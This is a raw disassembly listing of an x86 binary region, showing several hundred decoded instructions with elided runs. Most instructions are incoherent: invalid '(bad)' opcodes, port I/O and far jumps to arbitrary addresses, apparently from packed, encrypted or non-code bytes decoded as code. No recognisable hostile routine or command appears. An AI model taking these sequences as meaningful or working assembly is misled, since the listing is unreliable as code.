  4018f6:	shr    BYTE PTR ss:[ebx+0x2c7df000],0xf0
  4018fe:	repz test BYTE PTR [eax],0x49
  401902:	loopne 0x401977
  401904:	call   0x4e03:0xe906f1ac
  40190b:	shr    BYTE PTR [ebx+0x6253f000],0xe0
  401912:	jno    0x4018d6
  401914:	and    edi,ebp
  401916:	xchg   edi,eax
  401917:	jmp    0x5ceb3456
  40191c:	jmp    0xeb9d097a
  401921:	pop    ecx
  401922:	lock pop esp
  401924:	jmp    0xc3:0xe906f05b
	...
  40193b:	add    BYTE PTR [edi+0x73],ch
  40193e:	in     eax,0xdb
  401940:	scas   al,BYTE PTR es:[edi]
  401941:	shr    ecx,cl
  401943:	add    ebp,DWORD PTR [ecx+0x43]
  401946:	gs inc esp
  401948:	fcom   QWORD PTR [ebp+0x5e]
  40194b:	jns    0x401945
  40194d:	ficomp WORD PTR [edx]
  40194f:	out    dx,al
  401950:	inc    edi
  401951:	jmp    0x678627c
  401956:	jmp    0x94be095e
  40195b:	sti    
  40195c:	jp     0x401972
  40195e:	fs dec ecx
  401960:	sub    BYTE PTR [esi-0x3f],dl
  401963:	xor    eax,0x6
  401966:	jmp    0x1eae86eb
  40196b:	out    dx,eax
  40196c:	orps   xmm2,XMMWORD PTR [esi]
  40196f:	jns    0x401969
  401971:	jmp    0x6bb31931
  401976:	add    DWORD PTR [edi*2+0x8daaa05],eax
  40197d:	call   0x7b1b9582
  401982:	test   DWORD PTR [ecx-0x32],esi
  401985:	call   0x73075389
  40198a:	cld    
  40198b:	shl    DWORD PTR [eax+ebp*8],1
  40198e:	call   esi
  401990:	retf   0x74a8
  401993:	jmp    0x40192f
  401995:	stos   BYTE PTR es:[edi],al
  401996:	(bad)  
  401997:	cmp    al,0xc0
  401999:	(bad)  
  40199b:	xchg   ebp,eax
  40199c:	repz push es
  40199e:	mov    ebp,DWORD PTR [edx+0x0]
	...
  4019b0:	add    BYTE PTR [eax],al
  4019b2:	cmp    bh,BYTE PTR [esi+0x51f3e1c2]
  4019b8:	mov    edx,DWORD PTR [ebp-0x61073c8e]
  4019be:	or     bl,bh
  4019c0:	out    0x5b,eax
  4019c2:	call   0xc7ef:0x2860ffe8
  4019c9:	sub    al,0x80
  4019cb:	pop    es
  4019cc:	add    cl,ch
  4019ce:	repz out 0x75,eax
  4019d1:	in     eax,0x4b
  4019d3:	(bad)  
  4019d4:	std    
  4019d5:	outs   dx,BYTE PTR ds:[esi]
  4019d6:	dec    esi
  4019d7:	jl     0x401a2e
  4019d9:	cmc    
  4019da:	ficom  DWORD PTR [edx+ebp*2]
  4019dd:	jmp    0xdd3f208b
  4019e2:	push   edi
  4019e3:	call   0x728e6b5d
  4019e8:	or     BYTE PTR [esi-0x48],al
  4019eb:	cli    
  4019ec:	(bad)  
  4019ed:	fwait
  4019ee:	(bad)  
  4019ef:	mov    ebp,0x51f3e1c2
  4019f4:	mov    edi,DWORD PTR ds:0x2ef8c372
  4019fa:	test   al,0xee
  4019fc:	add    cl,ch
  4019fe:	repz push es
  401a00:	(bad)  
  401a01:	lods   al,BYTE PTR ds:[esi]
  401a02:	pop    ss
  401a03:	pop    es
  401a04:	add    cl,ch
  401a06:	repz jnp 0x401a5e
  401a09:	add    BYTE PTR [ecx],al
  401a0b:	ins    DWORD PTR es:[edi],dx
  401a0c:	adc    cl,BYTE PTR [ebp+0x6a50db94]
  401a12:	fcomp  st(0)
  401a14:	jne    0x401a12
	...
  401a26:	add    BYTE PTR [eax],al
  401a28:	into   
  401a29:	outs   dx,DWORD PTR ds:[esi]
  401a2a:	clc    
  401a2b:	push   DWORD PTR [ebx+ebp*8]
  401a2e:	(bad)  
  401a2f:	push   edx
  401a30:	lds    ebp,FWORD PTR [esi+0x45]
  401a33:	clc    
  401a34:	nop
  401a35:	les    eax,FWORD PTR [eax+eax*1]
  401a38:	add    al,0x6e
  401a3a:	in     al,dx
  401a3b:	push   0xffffffc8
  401a3d:	push   0xda090c45
  401a42:	jne    0x401a4c
  401a44:	mov    cl,0x19
  401a46:	cld    
  401a47:	dec    DWORD PTR [esi-0x55]
  401a4a:	ret    0x8908
  401a4d:	push   eax
  401a4e:	mov    ebp,esp
  401a50:	jecxz  0x401a50
  401a52:	mov    WORD PTR [ebp-0x73],es
  401a55:	push   ebx
  401a56:	push   DWORD PTR [ebp-0x6f]
  401a59:	retf   
  401a5a:	sub    bh,ah
  401a5c:	outs   dx,BYTE PTR ds:[esi]
  401a5d:	fxch   st(1)
  401a5f:	ret    0x361
  401a62:	push   ebp
  401a63:	mov    ebp,DWORD PTR [ebp-0x7b]
  401a66:	jge    0x401a74
  401a68:	dec    ecx
  401a69:	outs   dx,DWORD PTR ds:[esi]
  401a6a:	adc    al,0x83
  401a6c:	dec    esp
  401a6d:	adc    eax,DWORD PTR [eax]
  401a6f:	je     0x401ad0
  401a71:	fidiv  DWORD PTR [ebp+0x10]
  401a74:	sahf   
  401a75:	outs   dx,DWORD PTR ds:[esi]
  401a76:	or     al,0xff
  401a78:	and    al,0xeb
  401a7a:	out    0x9,eax
  401a7c:	lods   eax,DWORD PTR ds:[esi]
  401a7d:	fcos   
  401a7f:	leave  
  401a80:	fild   DWORD PTR [esi]
  401a82:	add    BYTE PTR [ebp-0x6e],dl
  401a85:	out    0xff,al
  401a87:	jne    0x401ac2
  401a89:	fidiv  DWORD PTR [ebp+0x8]
	...
  401a9c:	add    BYTE PTR [eax],al
  401a9e:	add    DWORD PTR [edi-0x7a110001],esi
  401aa4:	jge    0x401ab6
  401aa6:	lock fnsave [edi+0x14]
  401aaa:	jae    0x401b26
  401aac:	(bad)  
  401aad:	inc    DWORD PTR [ebx+0x75ecef]
  401ab3:	in     eax,0x76
  401ab5:	or     al,0xe7
  401ab7:	arpl   bx,di
  401ab9:	out    0xa7,eax
  401abb:	cmc    
  401abc:	in     al,dx
  401abd:	jmp    FWORD PTR [ecx+0x24ffffb2]
  401ac3:	pop    ecx
  401ac4:	fild   WORD PTR [ebx+0x7403ec45]
  401aca:	jmp    0xd7d8:0xc80c76d4
  401ad1:	add    al,dh
  401ad3:	mov    eax,0xb02b01
  401ad8:	in     eax,dx
  401ad9:	jne    0x401ac7
  401adb:	mov    ah,0x76
  401add:	or     BYTE PTR [eax-0x700013bf],cl
  401ae3:	xchg   edi,eax
  401ae4:	ror    DWORD PTR [eax],0xf0
  401ae7:	and    bh,BYTE PTR [ecx-0x14]
  401aea:	jae    0x401aff
  401aec:	adc    al,0xff
  401aee:	std    
  401aef:	(bad)  
  401af1:	jne    0x401aef
  401af3:	fs jbe 0x401afe
  401af6:	pop    eax
  401af7:	mov    ch,0xec
  401af9:	call   FWORD PTR [edi-0x77]
  401afc:	std    
  401afd:	(bad)  
  401afe:	fstp   st(7)
  401b00:	in     al,dx
  401b01:	jne    0x401b03
	...
  401b13:	add    ah,bh
  401b15:	inc    esp
  401b16:	jbe    0x401b20
  401b18:	pop    eax
  401b19:	imul   ebp,esp,0xc1273fff
  401b1f:	or     al,0xf0
  401b21:	cmp    BYTE PTR [eax-0x14],0x2f
  401b25:	fwait
  401b26:	sti    
  401b27:	out    0x27,eax
  401b29:	push   ds
  401b2a:	in     al,dx
  401b2b:	inc    eax
  401b2d:	leave  
  401b2e:	sti    
  401b2f:	addr16 xchg esi,eax
  401b31:	push   es
  401b32:	rol    DWORD PTR [edx-0x10],1
  401b35:	in     eax,0x94
  401b37:	sti    
  401b38:	rsqrtps xmm2,XMMWORD PTR [esi]
  401b3b:	in     al,dx
  401b3c:	push   DWORD PTR [eax-0x17]
  401b3f:	in     al,dx
  401b40:	jge    0x401b50
  401b42:	adc    DWORD PTR [edi],ebx
  401b44:	out    dx,eax
  401b45:	in     eax,0xfe
  401b47:	pop    eax
  401b48:	repnz xchg ebx,eax
  401b4a:	lods   al,BYTE PTR ds:[esi]
  401b4b:	jmp    FWORD PTR [edi]
  401b4d:	out    0x74,al
  401b4f:	sti    
  401b50:	iret   
  401b51:	sbb    esi,esp
  401b53:	jmp    0x401b24
  401b55:	jo     0x401b42
  401b57:	js     0x401b86
  401b59:	idiv   DWORD PTR [eax]
  401b5b:	jmp    0x401ba2
  401b5d:	xadd   DWORD PTR [ecx],esp
  401b60:	mov    bh,0xe5
  401b62:	(bad)  
  401b63:	dec    esp
  401b64:	mov    ecx,0x3d03edc8
  401b69:	xchg   edx,eax
  401b6a:	lds    eax,FWORD PTR [edi+0x71aee2b4]
  401b70:	call   0x902dff63
  401b75:	in     eax,0xd2
  401b77:	inc    eax
	...
  401b88:	add    BYTE PTR [eax],al
  401b8a:	hlt    
  401b8b:	(bad)  
  401b8c:	sub    al,0xe8
  401b8e:	jae    0x401bdb
  401b90:	(bad)  
  401b92:	or     DWORD PTR [edi],eax
  401b94:	xchg   BYTE PTR [ecx-0x4],dh
  401b97:	in     eax,0xf4
  401b99:	sti    
  401b9a:	dec    edi
  401b9b:	bnd jo 0x401b89
  401b9e:	pop    edi
  401b9f:	in     eax,0xf4
  401ba1:	out    0x57,eax
  401ba3:	pop    ebx
  401ba4:	icebp  
  401ba5:	fld    TBYTE PTR [ebx]
  401ba7:	in     al,0x5e
  401ba9:	jmp    0x401bf2
  401bab:	pop    ebx
  401bac:	loope  0x401b89
  401bae:	in     al,0xe2
  401bb0:	dec    esi
  401bb1:	jmp    0x401c1e
  401bb3:	dec    ebx
  401bb4:	inc    ebp
  401bb5:	mov    ebp,0x50e90e32
  401bba:	jnp    0x401bae
  401bbc:	add    BYTE PTR [edx+0x30],ch
  401bbf:	fcmovb st,st(7)
  401bc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401bc2:	pop    es
  401bc3:	push   es
  401bc4:	add    cl,ch
  401bc6:	repz xchg ebx,eax
  401bc8:	inc    ebp
  401bc9:	sbb    eax,0xe175e59c
  401bce:	sbb    edi,DWORD PTR [edx]
  401bd0:	aam    0xe9
  401bd2:	repz mov eax,eax
  401bd5:	or     DWORD PTR [eax],0xcbf175e4
  401bdb:	jmp    0x401bd6
  401bdd:	test   dl,0x8e
  401be0:	inc    ebp
  401be1:	icebp  
  401be2:	retf   0xfc5a
  401be5:	sar    eax,1
  401be7:	mov    bh,0x0
  401be9:	jmp    0xffb4c0b4
	...
  401bfe:	add    BYTE PTR [eax],al
  401c00:	retf   0xf85a
  401c03:	cmp    DWORD PTR [esi],edx
  401c05:	pop    es
  401c06:	call   0x470d43
  401c0b:	jo     0x401c3d
  401c0d:	(bad)  
  401c0f:	cmp    al,0x88
  401c11:	out    dx,eax
  401c12:	or     DWORD PTR [edx+0x1cff06f3],ebx
  401c18:	mov    esp,gs
  401c1a:	mov    ebx,0x8be49aa2
  401c1f:	sub    al,0x80
  401c21:	adc    al,0xc8
  401c23:	xchg   esi,eax
  401c24:	mov    ds:0x6bfcff37,eax
  401c29:	in     al,dx
  401c2a:	push   0x7f
  401c2c:	pop    edx
  401c2d:	in     al,0xc9
  401c2f:	stos   DWORD PTR es:[edi],eax
  401c30:	pop    edi
  401c31:	in     al,0x54
  401c33:	bound  edi,QWORD PTR [edi]
  401c35:	mov    ah,al
  401c37:	pop    ecx
  401c38:	xor    cl,BYTE PTR [edx-0xc]
  401c3b:	jmp    0x64402333
  401c40:	mov    al,0xe2
  401c42:	push   eax
  401c43:	dec    esi
  401c44:	ror    BYTE PTR [esi],0xe8
  401c47:	add    bh,al
  401c49:	mov    esp,0xc78c0000
  401c4e:	js     0x401c9d
  401c50:	out    0x56,al
  401c52:	or     al,ch
  401c54:	inc    edi
  401c55:	repz (bad) 
  401c57:	inc    DWORD PTR [eax+0x6483f846]
  401c5d:	lock add al,0x72
  401c60:	xor    eax,0xf86d8d
	...
  401c75:	add    BYTE PTR ds:0x1fc75f1,cl
  401c7b:	jg     0x401c4f
  401c7d:	add    cl,bl
  401c7f:	in     al,0xbf
  401c81:	je     0x401c1e
  401c83:	lock jne 0x401c7e
  401c86:	jns    0x401cc9
  401c88:	add    al,ch
  401c8a:	fsub   st,st(4)
  401c8c:	(bad)  
  401c8d:	call   esi
  401c8f:	lahf   
  401c90:	not    eax
  401c92:	push   eax
  401c93:	and    al,0xf4
  401c95:	call   FWORD PTR [edi+ebp*8]
  401c98:	call   0x4aa832
  401c9d:	jmp    0x401c5e
  401c9f:	out    dx,al
  401ca0:	jne    0x401caa
  401ca2:	mov    cl,0x23
  401ca4:	sti    
  401ca5:	inc    DWORD PTR [esi+0x1]
  401ca8:	ror    cl,0x5b
  401cab:	push   es
  401cac:	add    bl,ch
  401cae:	pop    DWORD PTR [edx]
  401cb0:	ror    cl,0x4b
  401cb3:	push   es
  401cb4:	add    BYTE PTR [edx-0x75],ch
  401cb7:	inc    ecx
  401cb8:	cld    
  401cb9:	jmp    FWORD PTR [edi+ebx*8-0x19]
  401cbd:	lock jno 0x401cad
  401cc0:	inc    edi
  401cc2:	or     al,0xdb
  401cc4:	add    DWORD PTR [eax],eax
  401cc6:	dec    ecx
  401cc7:	pop    es
  401cc8:	lea    eax,[ebp-0x57]
  401ccb:	cmp    bh,bh
  401ccd:	jne    0x401d10
  401ccf:	mov    edi,0x3cf0fbd2
  401cd4:	jmp    0x47dd25c
  401cd9:	je     0x401cdb
	...
  401ceb:	add    BYTE PTR [edx],al
  401ced:	fnstsw WORD PTR [ebx+0x6f19ad3b]
  401cf3:	pop    es
  401cf4:	pop    eax
  401cf5:	out    dx,al
  401cf6:	add    eax,DWORD PTR [eax]
  401cf8:	lock dec eax
  401cfa:	add    ch,BYTE PTR [ebx]
  401cfc:	xor    al,bh
  401cfe:	add    eax,0xc616302b
  401d03:	add    al,0xf0
  401d05:	mov    ds:0x2973ec7c,al
  401d0a:	in     al,dx
  401d0b:	lea    esi,ds:0x5dff540c
  401d11:	fcomp  st(3)
  401d13:	dec    eax
  401d14:	ret    
  401d15:	lock add eax,DWORD PTR [ebp-0xe3a750]
  401d1c:	inc    ebp
  401d1d:	fcomp  st(3)
  401d1f:	fmul   st,st(0)
  401d21:	shr    eax,0x89
  401d24:	xor    eax,0xb475e8b8
  401d29:	enter  0xd212,0xf0
  401d2d:	out    dx,eax
  401d2e:	cld    
  401d2f:	mov    edi,0x75e8bc1c
  401d34:	in     al,dx
  401d35:	cwde   
  401d36:	outs   dx,BYTE PTR ds:[esi]
  401d37:	clc    
  401d38:	inc    eax
  401d39:	enter  0xb17,0xf0
  401d3d:	out    dx,eax
  401d3e:	call   0xe8b8a1b8
  401d43:	shl    eax,1
  401d45:	out    dx,eax
  401d46:	call   0xb2c805c0
  401d4b:	cli    
  401d4c:	outs   dx,DWORD PTR ds:[esi]
  401d4d:	mov    DWORD PTR [edx+0xc2],edi
	...
  401d5f:	add    BYTE PTR [eax],al
  401d61:	add    al,bh
  401d63:	out    dx,eax
  401d64:	dec    esi
  401d65:	mov    ecx,DWORD PTR [ebp+ebp*2-0x41]
  401d69:	call   0x8e0ce231
  401d6e:	mov    ch,0x6
  401d70:	gs push ebx
  401d72:	inc    edi
  401d73:	pop    esp
  401d74:	icebp  
  401d75:	fstp   TBYTE PTR [eax]
  401d77:	mov    ch,0xe9
  401d79:	add    ebp,DWORD PTR [ebp-0x39]
  401d7c:	fidivr WORD PTR [ebx+0x67]
  401d7f:	pop    es
  401d80:	jmp    0xf19c4488
  401d85:	(bad)  [edi+ebx*8+0x36]
  401d89:	call   0xe87569f7
  401d8e:	test   edx,esp
  401d90:	adc    DWORD PTR [esi-0x316f8df],esp
  401d96:	aas    
  401d97:	adc    ch,BYTE PTR [ebp-0x79]
  401d9a:	lock push es
  401d9c:	jmp    0x717531b
  401da1:	outs   dx,BYTE PTR ds:[esi]
  401da2:	fsub   st(6),st
  401da4:	sub    ebx,edx
  401da6:	lock push es
  401da8:	push   0xffffffbf
  401daa:	in     al,dx
  401dab:	or     ebp,ecx
  401dad:	add    esp,DWORD PTR [eax]
  401daf:	pop    es
  401db0:	cmp    esp,ebx
  401db2:	cdq    
  401db3:	push   es
  401db4:	jmp    0xc58b86bc
  401db9:	out    0x3d,eax
  401dbb:	fcmovnb st,st(1)
  401dbd:	xchg   edi,eax
  401dbe:	cdq    
  401dbf:	push   es
  401dc0:	jmp    0xe44aca47
  401dc5:	add    eax,DWORD PTR [eax]
	...
  401dd7:	add    al,dh
  401dd9:	imul   al
  401ddb:	push   ebx
  401ddc:	mov    BYTE PTR [esi-0x17],dh
  401ddf:	add    esi,eax
  401de1:	(bad)  
  401de2:	sub    al,0xdc
  401de4:	sbb    al,BYTE PTR [edi]
  401de6:	sahf   
  401de7:	jno    0x401d75
  401de9:	loope  0x401e07
  401deb:	lock ja 0x401e49
  401dee:	and    edi,0x8d91d6e5
  401df4:	pop    ecx
  401df5:	push   es
  401df6:	jmp    0x3a527d
  401dfb:	pop    edi
  401dfc:	mov    cl,0xde
  401dfe:	push   esp
  401e00:	push   edi
  401e01:	out    dx,al
  401e02:	gs cmp ah,ch
  401e05:	push   es
  401e06:	call   esp
  401e08:	cmp    ebp,ecx
  401e0a:	nop
  401e0b:	push   ebx
  401e0c:	dec    edi
  401e0d:	loope  0x401e79
  401e0f:	loope  0x401ddc
  401e11:	data16 sub BYTE PTR [eax-0xe8a1e0d],ch
  401e18:	cmp    eax,edx
  401e1a:	cld    
  401e1b:	ss prefetch (bad)
  401e1d:	or     eax,0xda812ed8
  401e22:	call   FWORD PTR [ebx+ecx*1+0x171dbae9]
  401e29:	loope  0x401e4e
  401e2b:	xor    DWORD PTR [edi],ecx
  401e2d:	pop    ebx
  401e2e:	clc    
  401e2f:	push   cs
  401e30:	popa   
  401e31:	out    dx,eax
  401e32:	(bad)  
  401e33:	jl     0x401e20
  401e35:	call   0xe1171c1a
  401e3a:	and    edx,DWORD PTR [ecx]
	...
  401e4c:	add    BYTE PTR [eax],al
  401e4e:	iret   
  401e4f:	pop    edx
  401e50:	in     al,dx
  401e51:	add    edi,edi
  401e53:	push   es
  401e54:	add    cl,ch
  401e56:	into   
  401e57:	pop    edx
  401e58:	call   0x20e52e
  401e5d:	jmp    0xc1487930
  401e62:	(bad)  
  401e63:	fdivp  st(7),st
  401e65:	(bad)  
  401e66:	sub    al,ah
  401e68:	pop    ebx
  401e69:	mov    al,0xb1
  401e6b:	or     eax,DWORD PTR [eax]
  401e6d:	sbb    al,0x1b
  401e6f:	repz sub DWORD PTR [esp+ecx*4],0xffffffe0
  401e74:	jae    0x401e67
  401e76:	mov    ds,WORD PTR [edx+0x8]
  401e79:	xchg   ecx,eax
  401e7a:	lock mov ch,0x0
  401e7d:	jmp    0xac09e55c
  401e82:	outs   dx,DWORD PTR ds:[esi]
  401e83:	loopne 0x401ed9
  401e85:	add    dl,ah
  401e87:	mov    bh,0x8b
  401e89:	inc    ebp
  401e8a:	popa   
  401e8b:	pop    es
  401e8c:	add    BYTE PTR [eax],0x49
  401e8f:	add    al,0x50
  401e91:	push   0x19
  401e93:	ret    
  401e94:	repnz rcr BYTE PTR [ecx+0x4],1
  401e98:	leave  
  401e99:	ret    0x455
  401e9c:	push   ebp
  401e9d:	mov    ebp,DWORD PTR [ebp+0x3c8bfc50]
  401ea3:	fmul   QWORD PTR [edx+0xee51d4d]
  401ea9:	push   ecx
  401eaa:	enter  0x2c2,0x2b
  401eae:	leave  
  401eaf:	aam    0xab
  401eb1:	pop    ecx
	...
  401ec2:	add    BYTE PTR [eax],al
  401ec4:	call   0xc948:0xa3f303ea
  401ecb:	ret    0x401
  401ece:	push   ebp
  401ecf:	mov    ebp,ebp
  401ed1:	push   ecx
  401ed2:	push   edi
  401ed3:	mov    edi,DWORD PTR [edi+edx*8-0x5]
  401ed7:	mov    esp,DWORD PTR [esp+ebx*8-0x76]
  401edb:	dec    ebp
  401edc:	mov    ecx,0x25f302e4
  401ee1:	dec    ecx
  401ee2:	pop    esi
  401ee3:	leave  
  401ee4:	sbb    ebx,eax
  401ee6:	call   DWORD PTR [edx+eax*2-0x41]
  401eea:	push   esi
  401eeb:	push   edi
  401eec:	inc    edx
  401eed:	jo     0x401ef7
  401eef:	cld    
  401ef0:	push   edx
  401ef1:	sbb    BYTE PTR [eax],dl
  401ef3:	sub    ebx,DWORD PTR [ecx+0x5d]
  401ef6:	jge    0x401f04
  401ef8:	mov    edx,0xa2a6f304
  401efd:	pushf  
  401efe:	jne    0x401f01
  401f00:	leave  
  401f01:	dec    ecx
  401f02:	pop    esi
  401f03:	leave  
  401f04:	pop    ebx
  401f05:	fdivp  st(7),st
  401f07:	push   esp
  401f08:	add    bh,BYTE PTR [edi+0x505dc483]
  401f0e:	push   edi
  401f0f:	push   ebx
  401f10:	lock add eax,0xedf00102
  401f16:	in     al,0x75
  401f18:	clc    
  401f19:	jne    0x401eae
  401f1b:	call   FWORD PTR [edi+0x60]
  401f1e:	jns    0x401f9d
  401f20:	call   0x226b5c55
  401f25:	push   ss
  401f26:	add    al,0x1
	...
  401f38:	add    BYTE PTR [eax],al
  401f3a:	lock in eax,dx
  401f3c:	jnp    0x401f52
  401f3e:	cli    
  401f3f:	aas    
  401f40:	ret    0x39e2
  401f43:	or     BYTE PTR fs:[bx+0x78a8],dh
  401f49:	jne    0x401f3f
  401f4b:	das    
  401f4c:	aas    
  401f4d:	(bad)  
  401f4e:	lock hlt 
  401f50:	mov    edx,0x633b2b
  401f55:	cmp    edi,DWORD PTR [eax-0x56]
  401f58:	in     al,0x0
  401f5a:	lods   eax,DWORD PTR ds:[esi]
  401f5b:	daa    
  401f5c:	jp     0x401f62
  401f5e:	shr    ebp,0x3e
  401f61:	(bad)  
  401f62:	out    0x3f,eax
  401f64:	dec    edi
  401f65:	(bad)  
  401f66:	jp     0x401f4c
  401f68:	sub    DWORD PTR [eax+0x4579c8ec],ecx
  401f6e:	fistp  WORD PTR [eax+0x0]
  401f71:	cmp    dh,BYTE PTR [ecx]
  401f73:	cdq    
  401f74:	adc    BYTE PTR ss:[edx-0xe],al
  401f78:	sbb    cl,cl
  401f7a:	(bad)  
  401f7b:	mov    cl,0x6e
  401f7d:	aad    0x1b
  401f7f:	sbb    eax,0xe4b2c946
  401f84:	add    edx,DWORD PTR [ebp+0x7b]
  401f87:	pushf  
  401f88:	add    ah,0xa8
  401f8b:	add    DWORD PTR [esi+0x57],ecx
  401f8e:	lahf   
  401f8f:	adc    edi,esp
  401f91:	pop    edx
  401f92:	push   0xfffffff1
  401f94:	jnp    0x401fdb
  401f96:	lea    ebp,[edx+0x40]
  401f99:	add    DWORD PTR [eax+0x7],edi
  401f9c:	sub    al,0xe8
	...
  401fae:	add    BYTE PTR [eax],al
  401fb0:	imul   esp,edx,0x26
  401fb3:	cmp    eax,0xbce5546b
  401fb8:	mov    ch,0xde
  401fba:	jmp    0x72470fc2
  401fbf:	ss add dl,ch
  401fc2:	sub    esi,esp
  401fc4:	lods   eax,DWORD PTR ds:[esi]
  401fc5:	(bad)  
  401fc7:	lods   eax,DWORD PTR ds:[esi]
  401fc8:	mov    ch,0xdb
  401fca:	fisubr WORD PTR [ebp+0x4e711edc]
  401fd0:	aas    
  401fd1:	pop    es
  401fd2:	mov    ah,0xe7
  401fd4:	out    0x94,eax
  401fd6:	lods   al,BYTE PTR ds:[esi]
  401fd7:	out    0x7a,eax
  401fd9:	repz adc BYTE PTR [ebp+edi*4-0x24],bh
  401fde:	imul   BYTE PTR [ebp+0xf71dbb5]
  401fe4:	fmul   DWORD PTR ds:0x910c3e7f
  401fea:	xchg   esp,eax
  401feb:	in     al,0x78
  401fed:	repz loopne 0x402069
  401ff0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401ff1:	fucomp st(3)
  401ff3:	dec    esi
  401ff4:	not    BYTE PTR [eax+0x437b29fd]
  401ffa:	adc    DWORD PTR [ebx],esi
  401ffc:	cld    
  401ffd:	push   ss
  401ffe:	push   es
  401fff:	ds fsubr st,st(0)
  402002:	sub    DWORD PTR [ecx+0x2d],edi
  402005:	fsub   QWORD PTR [ecx+0x0]
  402008:	jp     0x40204d
  40200a:	in     eax,dx
  40200b:	jp     0x402040
  40200d:	or     BYTE PTR [esi+0x42],al
  402010:	sbb    edx,eax
  402012:	stos   DWORD PTR es:[edi],eax
  402013:	adc    BYTE PTR [eax],al
	...
  402025:	add    al,dh
  402027:	xor    esp,DWORD PTR [edx-0x10]
  40202a:	jno    0x401fee
  40202c:	mov    ebp,0x1adda7e2
  402031:	das    
  402032:	mov    ebx,0x40e0248b
  402037:	fiadd  WORD PTR [eax]
  402039:	cmp    al,0xfc
  40203b:	out    dx,al
  40203c:	mov    ds:0x8506ec99,eax
  402041:	test   eax,0xe9968ee3
  402046:	repz push es
  402048:	call   FWORD PTR [esp+edi*8]
  40204b:	out    dx,al
  40204c:	das    
  40204d:	xchg   edi,eax
  40204e:	push   ebx
  40204f:	fisttp QWORD PTR [ecx+0x75dd382c]
  402055:	jge    0x40209b
  402057:	outs   dx,BYTE PTR ds:[esi]
  402058:	iret   
  402059:	jmp    0xf6003251
  40205e:	ror    BYTE PTR [edi+0x53535945],cl
  402064:	hlt    
  402065:	push   ecx
  402066:	retf   0xffdc
  402069:	push   esi
  40206a:	jge    0x4020af
  40206c:	clc    
  40206d:	dec    esi
  40206e:	leave  
  40206f:	sar    bh,cl
  402071:	mov    esp,0x3975dd3b
  402076:	add    al,0x8a
  402078:	(bad)  
  402079:	ss adc ebx,ebp
  40207c:	jne    0x4020ab
  40207e:	adc    al,0x44
  402080:	iret   
  402081:	jmp    0xedb5fe79
  402086:	or     ebx,DWORD PTR [eax]
  402088:	iret   
  402089:	jmp    0x40208e
	...
  40209a:	add    BYTE PTR [eax],al
  40209c:	repz call DWORD PTR ss:[edi+esi*8-0x2de87a77]
  4020a5:	fdiv   st(7),st
  4020a7:	cdq    
  4020a8:	retf   
  4020a9:	mov    ds:0xdcd2f6fe,al
  4020ae:	jne    0x4020a5
  4020b0:	rcl    BYTE PTR [edx-0x8],cl
  4020b3:	je     0x40211d
  4020b5:	in     eax,dx
  4020b6:	(bad)  
  4020b7:	(bad)  
  4020b9:	aaa    
  4020ba:	call   0x1cb296
  4020bf:	into   
  4020c0:	dec    eax
  4020c1:	psubsb mm0,QWORD PTR [eax]
  4020c4:	into   
  4020c5:	mov    edx,0xb43ffff
  4020ca:	push   0x41f16b
  4020cf:	(bad)  
  4020d0:	mov    esp,0x5393e80a
  4020d5:	jmp    0xe9f12cd9
  4020da:	jne    0x4020d0
  4020dc:	xchg   BYTE PTR [edi],bh
  4020de:	clc    
  4020df:	(bad)  
  4020e0:	cld    
  4020e1:	or     ch,al
  4020e3:	xor    DWORD PTR [ebx-0x17],0xffffffff
  4020e7:	and    edx,DWORD PTR [ecx+0x71f875e9]
  4020ed:	popf   
  4020ee:	std    
  4020ef:	call   esi
  4020f1:	call   0x86e1296b
  4020f6:	idiv   edi
  4020f8:	xchg   esi,eax
  4020f9:	mov    ebx,es
  4020fb:	pop    ebx
  4020fc:	rol    cl,1
  4020fe:	or     BYTE PTR [eax],al
	...
  402110:	add    BYTE PTR [eax],al
  402112:	pop    esp
  402113:	(bad)  
  402114:	in     al,dx
  402115:	or     ebp,0xffffffb3
  402118:	push   edi
  402119:	mov    ecx,DWORD PTR [esp+edx*8+0xa]
  40211d:	ror    BYTE PTR [ebp+0xe],0xc7
  402121:	add    BYTE PTR [ecx],bl
  402123:	or     BYTE PTR [eax],al
  402125:	add    BYTE PTR [edx],ah
  402127:	jmp    0x2319eaf
  40212c:	jne    0x402135
  40212e:	inc    ebx
  40212f:	or     BYTE PTR [edx],al
  402131:	add    cl,bl
  402133:	in     al,dx
  402134:	jae    0x754200ae
  40213a:	into   
  40213b:	jns    0x40213d
  40213d:	add    ecx,ebx
  40213f:	pop    es
  402140:	jmp    0x402144
  402142:	mov    dl,0x91
  402144:	or     edx,0x202f0
  40214a:	inc    esp
  40214b:	inc    esp
  40214c:	cld    
  40214d:	push   eax
  40214e:	lock pop ds
  402150:	outs   dx,BYTE PTR ds:[esi]
  402151:	add    BYTE PTR [edi+0x25ff1032],ah
  402157:	(bad)  
  402158:	jmp    0x40212a
  40215a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40215b:	in     eax,dx
  40215c:	add    ecx,DWORD PTR [ebx]
  40215e:	mov    al,0x1a
  402160:	jno    0x4020ef
  402162:	sub    eax,0xf06a3496
  402167:	push   edx
  402168:	inc    edi
  402169:	hlt    
  40216a:	and    al,bh
  40216c:	add    edi,edi
  40216e:	in     eax,0xdd
  402170:	loopne 0x4021e7
  402172:	test   DWORD PTR fs:[ebp+0xcf],ebx
	...
  402185:	add    BYTE PTR [eax],al
  402187:	add    al,dh
  402189:	in     eax,dx
  40218a:	or     al,0xc0
  40218c:	(bad)  [ecx]
  40218e:	test   DWORD PTR [ebp+0x48],edi
  402191:	in     eax,dx
  402192:	push   edi
  402193:	inc    esi
  402194:	jae    0x402180
  402196:	xlat   BYTE PTR ds:[ebx]
  402197:	add    ebp,eax
  402199:	jmp    0x40211f
  40219b:	jge    0x4021d5
  40219d:	out    dx,al
  40219e:	push   edi
  40219f:	cmp    bh,BYTE PTR [ebx-0x56]
  4021a2:	fild   DWORD PTR [eax-0x40]
  4021a5:	inc    ebp
  4021a6:	inc    edx
  4021a7:	std    
  4021a8:	pop    ds
  4021a9:	inc    esp
  4021aa:	(bad)  
  4021ab:	clc    
  4021ac:	mov    gs:0xc7a750db,al
  4021b2:	add    ebp,DWORD PTR [edx-0x10]
  4021b5:	sub    al,0x57
  4021b7:	adc    bh,bh
  4021b9:	jns    0x40219a
  4021bb:	call   0x444e2d
  4021c0:	sti    
  4021c1:	das    
  4021c2:	pop    eax
  4021c3:	or     bh,BYTE PTR [edi]
  4021c5:	or     BYTE PTR [ecx],ch
  4021c7:	std    
  4021c8:	fild   WORD PTR [ecx]
  4021ca:	sub    eax,0x8ceccbff
